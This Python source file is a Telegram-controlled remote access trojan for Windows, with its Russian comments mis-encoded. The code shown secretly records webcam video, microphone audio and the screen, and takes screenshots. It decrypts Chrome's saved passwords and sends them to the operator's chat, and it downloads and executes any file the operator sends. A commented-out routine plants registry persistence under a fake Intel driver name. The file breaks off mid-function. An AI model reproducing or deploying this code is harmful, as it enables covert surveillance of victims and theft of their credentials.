import os
import cv2
import platform
import pyautogui
import sounddevice as sd
import numpy as np
import webbrowser
import time
from datetime import timedelta
import GPUtil
import sqlite3
import win32crypt
import winreg
import win32com.client
import sys
from Crypto.Cipher import AES
import json
import base64
import shutil
import subprocess
import pygetwindow as gw
import tempfile
from functools import wraps
import mss  # –ò–º–ø–æ—Ä—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ mss –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ —ç–∫—Ä–∞–Ω–∞
import wave
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
from aiogram.utils import executor
import psutil  # –ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏
import asyncio

# –£–∫–∞–∂–∏—Ç–µ —Å–≤–æ–π —Ç–æ–∫–µ–Ω Telegram –±–æ—Ç–∞
BOT_TOKEN = ''
CHAT_ID = ''

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# –ü–∞–ø–∫–∞, –≤ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥—É—Ç —Å–æ—Ö—Ä–∞–Ω—è—Ç—å—Å—è —Ñ–∞–π–ª—ã
DOWNLOAD_FOLDER = r"C:\ProgramData\downloaded_files"  # –ü—É—Ç—å –∫ ProgramData

# –ù–∞—á–∞–ª—å–Ω–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è (—Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª)
current_dir = os.path.expanduser(r"~\OneDrive\–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª")

# –î–µ—Ñ–æ–ª—Ç–Ω—ã–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
default_dirs = {
    "download": os.path.expanduser(r"~\Downloads"),
    "c:/": "C:/",
    "documents": os.path.expanduser(r"~\Documents"),
    "desktop": os.path.expanduser(r"~\OneDrive\–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª"),
    "users": r"C:\Users",  # –î–æ–±–∞–≤–ª–µ–Ω–∞ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è C:\Users
}

# –°–æ–∑–¥–∞–Ω–∏–µ –ø–∞–ø–∫–∏ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤, –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
if not os.path.exists(DOWNLOAD_FOLDER):
    os.makedirs(DOWNLOAD_FOLDER)


# def add_to_startup_registry():
#     """–î–æ–±–∞–≤–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É —á–µ—Ä–µ–∑ —Ä–µ–µ—Å—Ç—Ä."""
#     exe_path = sys.executable  # –ü—É—Ç—å –∫ —Ç–µ–∫—É—â–µ–º—É –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º—É —Ñ–∞–π–ª—É

#     try:
#         # –û—Ç–∫—Ä—ã–≤–∞–µ–º –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞
#         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
#                                  r"Software\Microsoft\Windows\CurrentVersion\Run",
#                                  0, winreg.KEY_SET_VALUE)

#         # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å
#         winreg.SetValueEx(reg_key, "Intel(R) Dynamic Driver Intergration", 0, winreg.REG_SZ, exe_path)
#         winreg.CloseKey(reg_key)

#         await bot.send_message(CHAT_ID, "–ü—Ä–æ–≥—Ä–∞–º–º–∞ –≤ —Ä–µ–µ—Å—Ç—Ä–µ")
#     except Exception as e:
#         await bot.send_message(CHAT_ID, f"–ü—Ä–æ–≥—Ä–∞–º–º–∞ –≤ —Ä–µ–µ—Å—Ç—Ä–µ ERROR: {e}")

# # –í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã
# add_to_startup_registry()


def restricted(func):
    """–î–µ–∫–æ—Ä–∞—Ç–æ—Ä –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω–æ–≥–æ CHAT_ID."""
    @wraps(func)
    async def wrapper(message: types.Message, *args, **kwargs):
        if str(message.chat.id) != CHAT_ID:
            await message.reply("–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é —ç—Ç–æ–≥–æ –±–æ—Ç–∞.")
            return
        return await func(message, *args, **kwargs)
    return wrapper



@dp.message_handler(commands=["start"])
@restricted
async def start_command(message: types.Message):
    commands_info = """
üëã –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –í–æ—Ç —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥:
 by: https://github.com/Luqidniy

üé• **–†–∞–±–æ—Ç–∞ —Å –≤–∏–¥–µ–æ –∏ —Ñ–æ—Ç–æ:**
/webrec {–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å} ‚Äî –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥.
/webscreen ‚Äî –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã.
/screen ‚Äî –°–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞.
/screenrec {–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å} ‚Äî –ó–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ —ç–∫—Ä–∞–Ω–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥.

üé§ **–†–∞–±–æ—Ç–∞ —Å–æ –∑–≤—É–∫–æ–º:**
/voice {–¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å} ‚Äî –ó–∞–ø–∏—Å–∞—Ç—å –∑–≤—É–∫ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–µ–∫—É–Ω–¥.

üíª **–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –∏ –ø–∞—Ä–æ–ª–∏:**
/sysinfo - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö
/chrome - –ü–∞—Ä–æ–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ Chrome

üîß **–î—Ä—É–≥–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏:**
/calc ‚Äî –û—Ç–∫—Ä—ã—Ç—å –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ.
/vbs {—Ç–µ–∫—Å—Ç –æ—à–∏–±–∫–∏} ‚Äî –°–æ–∑–¥–∞—Ç—å –∏ –∑–∞–ø—É—Å—Ç–∏—Ç—å VBS —Å–∫—Ä–∏–ø—Ç —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º —Ç–µ–∫—Å—Ç–æ–º –æ—à–∏–±–∫–∏.
/url {—Å—Å—ã–ª–∫–∞} ‚Äî –û—Ç–∫—Ä—ã—Ç—å —É–∫–∞–∑–∞–Ω–Ω—É—é —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ.
/startup - –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ —Å—Ç–∞—Ä—Ç –º–µ–Ω—é –ø–æ–∫–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç –¥–æ–ª–∂–Ω—ã–º –æ–±—Ä–∞–∑–æ–º lol

üîå **–†–∞–±–æ—Ç–∞ —Å –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏:**
/list_process - –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
/kill {PID –ø—Ä–æ—Ü–µ—Å—Å–∞} - –æ—Ç–∫–ª—é—á–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å

üìÇ **–†–∞–±–æ—Ç–∞ —Å —Ñ–∞–π–ª–∞–º–∏:**
–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª (–¥–æ–∫—É–º–µ–Ω—Ç, —Ñ–æ—Ç–æ, –∞—É–¥–∏–æ), –∏ –æ–Ω –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –∏ –∑–∞–ø—É—â–µ–Ω –Ω–∞ –≤–∞—à–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ.

/ls - –ü–æ–∫–∞–∑–∞—Ç—å —Ñ–∞–π–ª—ã –∏ –ø–∞–ø–∫–∏ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
/cd [–ù–æ–º–µ—Ä –ø–∞–ø–∫–∏ –∏–ª–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏] - –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å—Å—è –≤ –ø–∞–ø–∫—É
/load [–ù–æ–º–µ—Ä —Ñ–∞–π–ª–∞] - –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª
/rm - —É–¥–∞–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–∞

–î–ï–§–û–õ–¢–ù–´–ï –î–ò–†–ï–ö–¢–û–†–ò–ò: download, c:/, documents, desktop, users. (–≠—Ç–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —Å –ø–∞–ø–∫–æ–π —Å –∑–∞–≥—Ä—É–∑–∫–∞–º–∏, –¥–∏—Å–∫–æ–º C, –î–æ–∫—É–º–µ–Ω—Ç—ã, –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª –∏ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏)
"""
    await message.reply(commands_info)




# –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–ø—É—Å–∫–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã
async def notify_startup():
    await bot.send_message(CHAT_ID, "–ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–ø—É—â–µ–Ω–∞ –Ω–∞ –ü–ö!")

asyncio.run(notify_startup())



async def get_chrome_passwords():
    # –ü—É—Ç—å –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π Chrome
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')

    # –ß–∏—Ç–∞–µ–º –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏–∑ Local State
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–µ—Ä–≤—ã–µ 5 –±–∞–π—Ç
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    # –ö–æ–ø–∏—Ä—É–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö, —á—Ç–æ–±—ã –Ω–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å Chrome
    shutil.copyfile(db_path, "Login Data.db")

    # –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ –∫–æ–ø–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    password_data = []
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]

        # –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –ø–∞—Ä–æ–ª—è
        nonce, ciphertext = encrypted_password[3:15], encrypted_password[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_password = cipher.decrypt_and_verify(ciphertext, encrypted_password[-16:])

        password_data.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password.decode('utf-8')}\n")
    
    cursor.close()
    conn.close()
    os.remove("Login Data.db")

    return password_data

async def send_chrome_passwords(message: types.Message):
    password_data = await get_chrome_passwords()

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
    file_path = os.path.join(DOWNLOAD_FOLDER, "chrome_passwords.txt")
    with open(file_path, "w", encoding='utf-8') as f:
        f.writelines(password_data)

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    await message.reply("–ü–∞—Ä–æ–ª–∏ –∏–∑ Chrome –±—ã–ª–∏ –∏–∑–≤–ª–µ—á–µ–Ω—ã –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ —Ñ–∞–π–ª.")
    await bot.send_document(message.chat.id, InputFile(file_path))

    # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
    os.remove(file_path)

@dp.message_handler(commands=['chrome'])
@restricted
async def handle_chrome_passwords(message: types.Message):
    await send_chrome_passwords(message)




# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ
@dp.message_handler(commands=["webrec"])
@restricted
async def record_video(message: types.Message):
    args = message.get_args()
    if not args.isdigit():
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö.")
        return
    duration = int(args)
    
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(os.path.join(DOWNLOAD_FOLDER, 'output.avi'), fourcc, 20.0, (640, 480))
    
    for _ in range(duration * 20):  # 20 FPS
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
        await asyncio.sleep(0.05)  # –ù–µ–º–Ω–æ–≥–æ –∑–∞–¥–µ—Ä–∂–∫–∏ –¥–ª—è —Ü–∏–∫–ª–æ–≤ –∑–∞–ø–∏—Å–∏
    
    cap.release()
    out.release()
    await bot.send_document(message.chat.id, InputFile(os.path.join(DOWNLOAD_FOLDER, 'output.avi')))

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã
@dp.message_handler(commands=["webscreen"])
@restricted
async def capture_photo(message: types.Message):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        photo_path = os.path.join(DOWNLOAD_FOLDER, "photo.jpg")
        cv2.imwrite(photo_path, frame)
        await bot.send_photo(message.chat.id, InputFile(photo_path))
    cap.release()

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ –∑–≤—É–∫–∞
@dp.message_handler(commands=["voice"])
@restricted
async def record_audio(message: types.Message):
    args = message.get_args()
    if not args.isdigit():
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö.")
        return
    duration = int(args)

    fs = 44100  # –ß–∞—Å—Ç–æ—Ç–∞ –¥–∏—Å–∫—Ä–µ—Ç–∏–∑–∞—Ü–∏–∏
    channels = 1  # –û–¥–∏–Ω –∫–∞–Ω–∞–ª –¥–ª—è –º–æ–Ω–æ-–∑–∞–ø–∏—Å–∏
    try:
        await message.reply("–ù–∞—á–∏–Ω–∞—é –∑–∞–ø–∏—Å—å –∑–≤—É–∫–∞...")
        # –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=channels, dtype='int16')
        sd.wait()

        # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ WAV —Ñ–∞–π–ª
        filename = os.path.join(DOWNLOAD_FOLDER, "audio.wav")
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)  # 2 –±–∞–π—Ç–∞ –Ω–∞ —Å–µ–º–ø–ª (16 –±–∏—Ç)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())

        await bot.send_document(message.chat.id, InputFile(filename))
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏: {e}")


# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ —ç–∫—Ä–∞–Ω–∞
@dp.message_handler(commands=["screenrec"])
@restricted
async def screen_record(message: types.Message):
    args = message.get_args()
    if not args.isdigit():
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö.")
        return
    duration = int(args)

    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –æ–±–ª–∞—Å—Ç–∏ –∑–∞—Ö–≤–∞—Ç–∞ —ç–∫—Ä–∞–Ω–∞ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –≤–µ—Å—å —ç–∫—Ä–∞–Ω)
    monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}  # –†–∞–∑–º–µ—Ä —ç–∫—Ä–∞–Ω–∞ 1920x1080

    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(os.path.join(DOWNLOAD_FOLDER, 'screen_capture.avi'), fourcc, 20.0, (monitor['width'], monitor['height']))

    # –ó–∞—Ö–≤–∞—Ç —ç–∫—Ä–∞–Ω–∞
    with mss.mss() as sct:
        start_time = asyncio.get_event_loop().time()
        while (asyncio.get_event_loop().time() - start_time) < duration:
            # –°–Ω–∏–º–æ–∫ —ç–∫—Ä–∞–Ω–∞
            screenshot = sct.grab(monitor)
            img = np.array(screenshot)
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  # –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ —Ü–≤–µ—Ç–∞
            out.write(img)
            await asyncio.sleep(0.05)  # –ù–µ–º–Ω–æ–≥–æ –∑–∞–¥–µ—Ä–∂–∫–∏ –¥–ª—è —Å–Ω–∏–∂–µ–Ω–∏—è –Ω–∞–≥—Ä—É–∑–∫–∏

    out.release()
    await bot.send_document(message.chat.id, InputFile(os.path.join(DOWNLOAD_FOLDER, 'screen_capture.avi')))


# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ —ç–∫—Ä–∞–Ω–∞
@dp.message_handler(commands=["screen"])
@restricted
async def screenshot(message: types.Message):
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(DOWNLOAD_FOLDER, "screenshot.png")
    screenshot.save(screenshot_path)
    await bot.send_photo(message.chat.id, InputFile(screenshot_path))

@dp.message_handler(commands=["calc"])
@restricted
async def open_calculator(message: types.Message):
    try:
        # –ó–∞–ø—É—Å–∫ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞ –≤ Windows –±–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –∫–æ–Ω—Å–æ–ª–∏
        subprocess.Popen(["calc"], shell=True)
        await message.reply("–û—Ç–∫—Ä—ã–≤–∞—é –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä!")
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞: {e}")


@dp.message_handler(commands=["vbs"])
@restricted
async def vbs_error(message: types.Message):
    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—Å—Ç –æ—à–∏–±–∫–∏ –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã
    error_text = message.get_args()
    if not error_text:
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —Ç–µ–∫—Å—Ç –æ—à–∏–±–∫–∏ –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã.")
        return

    # –°–æ–∑–¥–∞–µ–º VBS —Å–∫—Ä–∏–ø—Ç —Å —Ç–µ–∫—Å—Ç–æ–º –æ—à–∏–±–∫–∏
    vbs_code = f'''
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Popup "{error_text}", 5, "–û—à–∏–±–∫–∞", 16
    '''

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º VBS –∫–æ–¥ –≤ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª
    with tempfile.NamedTemporaryFile(delete=False, suffix=".vbs") as vbs_file:
        vbs_file.write(vbs_code.encode())
        vbs_file_path = vbs_file.name

    try:
        # –ó–∞–ø—É—Å–∫–∞–µ–º VBS —Ñ–∞–π–ª –±–µ–∑ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –∫–æ–Ω—Å–æ–ª–∏
        subprocess.Popen(["wscript", vbs_file_path], shell=True)
        await message.reply("–û—à–∏–±–∫–∞ —Å VBS —Å–∫—Ä–∏–ø—Ç–æ–º –±—ã–ª–∞ –ø–æ–∫–∞–∑–∞–Ω–∞!")
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ VBS —Å–∫—Ä–∏–ø—Ç–∞: {e}")



# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è URL –≤ –±—Ä–∞—É–∑–µ—Ä–µ
@dp.message_handler(commands=["url"])
@restricted
async def open_url(message: types.Message):
    # –ü–æ–ª—É—á–∞–µ–º URL –∏–∑ –∫–æ–º–∞–Ω–¥—ã
    url = message.get_args()
    if not url:
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ —Å—Å—ã–ª–∫—É –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã.")
        return

    # –û—Ç–∫—Ä—ã–≤–∞–µ–º —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ
    try:
        webbrowser.open(url)
        await message.reply(f"–û—Ç–∫—Ä—ã–≤–∞—é —Å—Å—ã–ª–∫—É: {url}")
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ —Å—Å—ã–ª–∫–∏: {e}")


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è —Ñ–∞–π–ª–∞ –∏ –µ–≥–æ –∑–∞–ø—É—Å–∫–∞
async def download_and_run_file(message: types.Message):
    # –ü–æ–ª—É—á–∞–µ–º —Ñ–∞–π–ª
    file_id = message.document.file_id if message.document else \
              message.photo[-1].file_id if message.photo else \
              message.audio.file_id if message.audio else None

    if not file_id:
        await message.reply("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª (—Ñ–æ—Ç–æ, –≤–∏–¥–µ–æ, –∑–≤—É–∫).")
        return

    # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Ñ–∞–π–ª–µ
    file_info = await bot.get_file(file_id)
    file_name = file_info.file_path.split('/')[-1]
    file_path = os.path.join(DOWNLOAD_FOLDER, file_name)

    # –ó–∞–≥—Ä—É–∂–∞–µ–º —Ñ–∞–π–ª
    await bot.download_file(file_info.file_path, file_path)

    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ñ–∞–π–ª
    try:
        if file_name.lower().endswith(('.jpg', '.jpeg', '.png', '.bmp', '.gif')):
            # –î–ª—è –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –ø—Ä–æ—Å–º–æ—Ç—Ä—â–∏–∫
            subprocess.run(["start", file_path], shell=True)
        elif file_name.lower().endswith(('.mp4', '.avi', '.mkv')):
            # –î–ª—è –≤–∏–¥–µ–æ
            subprocess.run([file_path], shell=True)
        elif file_name.lower().endswith(('.mp3', '.wav', '.ogg')):
            # –î–ª—è –∞—É–¥–∏–æ
            subprocess.run([file_path], shell=True)
        else:
            # –î–ª—è –æ—Å—Ç–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
            subprocess.run([file_path], shell=True)

        await message.reply(f"–§–∞–π–ª '{file_name}' –±—ã–ª –∑–∞–≥—Ä—É–∂–µ–Ω –∏ –∑–∞–ø—É—â–µ–Ω –Ω–∞ –ü–ö.")
    except Exception as e:
        await message.reply(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ —Ñ–∞–π–ª–∞: {e}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –ø—Ä–∏–µ–º–∞ –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤
@dp.message_handler(content_types=[types.ContentType.DOCUMENT, types.ContentType.PHOTO, types.ContentType.AUDIO])
@restricted
async def handle_file(message: types.Message):
    await download_and_run_file(message)


@dp.message_handler(commands=["list_process"])
@restricted
async def list_process_command(message: types.Message):
    try:
        # –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Ç–æ–ª—å–∫–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
        processes = []
        for proc in psutil.process_iter(attrs=["pid", "name"]):
            try:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –æ—Ç–∫—Ä—ã—Ç–æ–µ –æ–∫–Ω–æ —É –ø—Ä–æ—Ü–µ—Å—Å–∞
                if proc.info["name"] and psutil.Process(proc.info["pid"]).status() == "running":
                    processes.append(f"PID: {proc.info['pid']} - {proc.info['name']}")
            except (psutil.AccessDenied, psutil.NoSuchProcess):
                continue

        # –§–∏–ª—å—Ç—Ä—É–µ–º —Ç–æ–ª—å–∫–æ –ø—Ä–æ—Ü–µ—Å—Å—ã —Å –æ–∫–Ω–∞–º–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –ø—Ä–æ–≥—Ä–∞–º–º—ã —Å –≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º)
        filtered_processes = [p for p in processes if "svchost.exe" not in p and "System" not in p]

        if not filtered_processes:
            await message.reply("–ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∞–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.")
        else:
            # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –≤—ã–≤–æ–¥ –ø–µ—Ä–≤—ã–º–∏ 50 –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏
            processes_list = "\n".join(filtered_processes[:50])
            await message.reply(f"üìã –ê–∫—Ç–∏–≤–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è (–º–∞–∫—Å. 50):\n\n{processes_list}", parse_mode="HTML")
    except Exception as e:
